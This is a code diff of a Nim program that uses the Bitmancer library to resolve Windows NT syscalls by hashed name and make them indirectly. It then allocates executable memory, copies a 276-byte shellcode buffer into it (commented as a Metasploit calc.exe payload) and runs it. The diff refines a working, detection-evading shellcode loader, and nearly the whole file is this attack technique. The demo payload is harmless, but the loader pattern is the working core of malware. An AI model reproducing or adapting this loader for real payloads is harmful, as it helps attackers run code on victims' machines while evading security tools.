@@ -1,47 +1,19 @@
 import ../Bitmancer/syscalls
 import ../Bitmancer/core/obfuscation/hash
 
-# 
-# Additional types
-
-type
-  PS_ATTR_UNION* {.pure, union.} = object
-    Value*: ULONG
-    ValuePtr*: PVOID
-  PS_ATTRIBUTE* {.pure.} = object
-    Attribute*: ULONG 
-    Size*: SIZE_T
-    u1*: PS_ATTR_UNION
-    ReturnLength*: PSIZE_T
-  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
-  PS_ATTRIBUTE_LIST* {.pure.} = object
-    TotalLength*: SIZE_T
-    Attributes*: array[2, PS_ATTRIBUTE]
-  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
-
-
 # ----------------------------------------------------------------------------
 # Define syscalls
 
 type 
-    NtClose                 = proc(h: HANDLE): NTSTATUS {.stdcall, gcsafe.}
-    NtOpenProcess           = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall, gcsafe.}
     NtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall, gcsafe.}
     NtWriteVirtualMemory    = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, gcsafe.}
-    NtCreateThreadEx        = proc(TreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall, gcsafe.}
 
 const
-    NtCloseHash                 = ctDjb2 "NtClose"
-    NtOpenProcessHash           = ctDjb2 "NtOpenProcess"
     NtAllocateVirtualMemoryHash = ctDjb2 "NtAllocateVirtualMemory"
     NtWriteVirtualMemoryHash    = ctDjb2 "NtWriteVirtualMemory"
-    NtCreateThreadExHash        = ctDjb2 "NtCreateThreadEx"
 
-genSyscall(NtClose)       # Macro creates function NtCloseWrapper
-genSyscall(NtOpenProcess) 
 genSyscall(NtAllocateVirtualMemory)
 genSyscall(NtWriteVirtualMemory)
-genSyscall(NtCreateThreadEx)
 
 # ----------------------------------------------------------------------------
 # Configure Bitmancer
@@ -52,23 +24,18 @@ const
     exeEnum = SyscallExecution.Indirect
 
 # ----------------------------------------------------------------------------
-# Resolve syscalls
-
-let 
-    Ntdll = NTDLL_BASE().valueOr():
-        echo "Failed to find NTDLL"
-        quit()
-
-    NtCloseSyscall                 = ctGetNtSyscall[NtClose](Ntdll, ModuleHandle(NULL), NtCloseHash, symEnum, ssnEnum, exeEnum)
-    NtOpenProcessSyscall           = ctGetNtSyscall[NtOpenProcess](Ntdll, ModuleHandle(NULL), NtOpenProcessHash, symEnum, ssnEnum, exeEnum)
-    NtAllocateVirtualMemorySyscall = ctGetNtSyscall[NtAllocateVirtualMemory](Ntdll, ModuleHandle(NULL), NtAllocateVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
-    NtWriteVirtualMemory           = ctGetNtSyscall[NtWriteVirtualMemory](Ntdll, ModuleHandle(NULL), NtWriteVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
-    NtCreateThreadEx               = ctGetNtSyscall[NtCreateThreadEx](Ntdll, ModuleHandle(NULL), NtCreateThreadExHash, symEnum, ssnEnum, exeEnum)
-
-# ----------------------------------------------------------------------------
 # Basic Injection
 
-proc inject(): NtResult =
+proc inject(): NtResult[bool] = # you need to wrap the result in some sort of NtResult[]
+    # Get ntdll
+    let Ntdll = NTDLL_BASE().valueOr():
+        return
+
+    # Resolve syscalls
+    var NtAllocateVirtualMemorySyscall = ctGetNtSyscall[NtAllocateVirtualMemory](Ntdll, ModuleHandle(NULL), NtAllocateVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
+    var NtWriteVirtualMemorySyscall    = ctGetNtSyscall[NtWriteVirtualMemory](Ntdll, ModuleHandle(NULL), NtWriteVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
+
+
     # I think this is a msf calc.exe payload :-)
     var buf: array[276, byte] = [
         byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
@@ -99,10 +66,15 @@ proc inject(): NtResult =
     
     var sc_size: SIZE_T = cast[SIZE_T](buf.len)
     var dest: LPVOID
-    var ret = NtAllocateVirtualMemoryWrapper(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE, NtAllocateVirtualMemorySyscall.wSyscall, NtAllocateVirtualMemorySyscall.pSyscall, NtAllocateVirtualMemorySyscall.pFunction)
+    var current_process: HANDLE = cast[HANDLE](-1) # pseudo handle to current proc
+
+    var ret = NtAllocateVirtualMemoryWrapper(current_process, &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE, NtAllocateVirtualMemorySyscall.wSyscall, NtAllocateVirtualMemorySyscall.pSyscall, NtAllocateVirtualMemorySyscall.pFunction)
     
     var bytesWritten: SIZE_T
-    ret = NtWriteVirtualMemoryWrapper(getCurrentProcess(), dest, unsafeAddr buf, sc_size-1, addr bytesWritten, NtWriteVirtualMemorySyscall.wSyscall, NtWriteVirtualMemorySyscall.pSyscall, NtWriteVirtualMemorySyscall.pFunction)
+    ret = NtWriteVirtualMemoryWrapper(current_process, dest, unsafeAddr buf, sc_size-1, addr bytesWritten, NtWriteVirtualMemorySyscall.wSyscall, NtWriteVirtualMemorySyscall.pSyscall, NtWriteVirtualMemorySyscall.pFunction)
     
     let f = cast[proc(){.nimcall.}](dest)
     f()
+
+when isMainModule:
+    discard inject()
